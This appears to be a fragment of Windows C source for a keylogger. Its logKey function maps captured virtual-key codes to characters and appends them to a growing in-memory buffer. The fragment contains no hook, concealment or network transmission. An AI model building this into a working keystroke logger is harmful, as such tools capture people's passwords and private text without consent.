#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char* baseAddress;
    size_t size;
    size_t used;
} MemoryRegion;

int logKey(int _key, MemoryRegion* memRegion) {
    char output[2]; // Buffer to store a single character
    output[1] = '\0'; // Null-terminate the string

    // Map the virtual key to its character representation
    if ((_key >= 0x30 && _key <= 0x39) || // Numbers
        (_key >= 0x41 && _key <= 0x5A)) { // Letters
        output[0] = (char)_key; // Map directly
    }
    else {
        // Handle special keys (you can add more mappings if needed)
        switch (_key) {
        case VK_SPACE: output[0] = ' '; break;
        case VK_RETURN: output[0] = '\n'; break;
        case VK_TAB: output[0] = '\t'; break;
        default: return 0; // Ignore unmapped keys
        }
    }

    size_t outputLen = strlen(output);

    // Check if there's enough space in the memory region
    if (memRegion->used + outputLen + 1 > memRegion->size) {
        size_t newSize = memRegion->size * 2;
        char* newBase = (char*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, memRegion->baseAddress, newSize);
        if (newBase == NULL) {
            perror("Memory reallocation failed");
            return 1; // Error
        }
        memRegion->baseAddress = newBase;
        memRegion->size = newSize;
    }

    // Append the character to the memory region
    memcpy(memRegion->baseAddress + memRegion->used, output, outputLen);
    memRegion->used += outputLen;

    // Add a null terminator
    memRegion->baseAddress[memRegion->used] = '\0';

    return 0;
}
